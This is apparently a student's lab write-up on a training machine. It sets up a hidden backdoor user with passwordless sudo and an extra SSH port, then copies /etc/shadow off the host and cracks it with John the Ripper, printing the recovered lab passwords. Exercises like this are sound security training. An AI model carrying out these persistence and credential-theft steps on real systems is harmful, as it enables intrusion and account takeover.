Step 1: Shadow People


Create a secret user named sysd. Make sure this user doesn't have a home folder created:

	root:~\ $ sudo useradd -M 666 sysd

* I was wondering what the consequences of creating a user with a uid that was already in use would be. So like, sudo useradd -Mou <uid in use> <username>

Is there any reason to do that, or is it just as much trouble as it sounds?

Give your secret user a password:

	root:~\ $ sudo passwd sysd

Give your secret user a system UID < 1000:

I actually gave my sysd user a UID of 666 in the first step, but:
	root:~\ $ sudo usermod sysd -u <number less than 1000>

Give your secret user the same GID:

	root:~\ $ sudo usermod sysd -g 666

Give your secret user full sudo access without the need for a password:

	root:~\ $ sudo visudo
		#Unit_06 Privs for the badman
		sysd ALL=(ALL) NOPASSWD:ALL

Test that sudo access works without your password:

	root:home\ $ su sysd
	$ sudo -l
	Matching Defaults entries for sysd on scavenger-hunt:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User sysd may run the following commands on scavenger-hunt:
		(ALL) NOPASSWD: ALL

At no time was I asked for sysd password.

Step 2: Smooth Sailing


Edit the sshd_config file:

	root:/\ $ sudo nano etc/ssh/sshd_config
		# The strategy used for options in the default sshd_config shipped with
		# OpenSSH is to specify options with their default value where
		# possible, but leave them commented.  Uncommented options override the
		# default value.

		Port 22
		Port 2222
		#AddressFamily any
		#ListenAddress 0.0.0.0
		#ListenAddress ::

Step 3: Testing Your Configuration Update


Restart the SSH service:

	root:/\ $ sudo systemctl restart sshd

Exit the root account:

	root:/\ $ exit

SSH to the target machine using your sysd account and port 2222:

	sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222

Use sudo to switch to the root user:

	$ sudo -s
	# whoami
	root

Step 4: Crack All the Passwords


SSH back to the system using your sysd account and port 2222:

	sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

* I don't think I even checked to see if the target machine had JtR, I just decided to use sftp after creating a copy of the shadow file and using chmod to make sure I had permissions.

	sysadmin@UbuntuDesktop:/$ ssh sysd@192.168.6.105 -p 2222
	$ sudo -s
	# whoami
	root
	# sudo cp etc/shadow tmp/shadow-copy
	# exit
	$ exit
	sysadmin@UbuntuDesktop:/$ sftp -oPort=2222 sysd@192.168.6.105
	sysd@192.168.6.105's password:
	Connected to 192.168.6.105.
	sftp> cd tmp
	sftp> get shadow-copy
	Fetching /tmp/shadow-copy to shadow-copy
	/tmp/shadow-copy                              100% 1592   794.0KB/s   00:00
	sftp> byee
	Invalid command.
	sftp> bye
	sysadmin@UbuntuDesktop:/$ john shadow-copy
	Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
	Press 'q' or Ctrl-C to abort, almost any other key for status
	computer         (stallman)
	freedom          (babbage)
	trustno1         (mitnik)
	dragon           (lovelace)
	lakers           (turing)
	passw0rd         (sysadmin)
	Goodluck!        (student)
	
